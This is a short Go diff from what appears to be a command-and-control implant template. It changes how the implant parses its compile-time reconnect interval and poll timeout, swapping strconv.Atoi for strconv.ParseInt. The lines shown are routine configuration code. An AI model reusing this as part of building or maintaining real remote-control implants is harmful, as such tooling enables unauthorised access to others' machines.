@@ -104,7 +104,7 @@ func randomCCDomain(next string) string {
 // GetReconnectInterval - Parse the reconnect interval inserted at compile-time
 func GetReconnectInterval() time.Duration {
 	if reconnectInterval == time.Duration(0) {
-		reconnect, err := strconv.Atoi(`{{.Config.ReconnectInterval}}`)
+		reconnect, err := strconv.ParseInt(`{{.Config.ReconnectInterval}}`, 10, 64)
 		if err != nil {
 			reconnectInterval = 60 * time.Second
 		} else {
@@ -123,7 +123,7 @@ func SetReconnectInterval(interval int64) {
 func GetPollTimeout() time.Duration {
 	minTimeout := 10 * time.Second // Somewhat arbitrary minimum poll timeout
 	if pollTimeout == time.Duration(0) {
-		poll, err := strconv.Atoi(`{{.Config.PollTimeout}}`)
+		poll, err := strconv.ParseInt(`{{.Config.PollTimeout}}`, 10, 64)
 		if err != nil {
 			pollTimeout = minTimeout
 		} else {
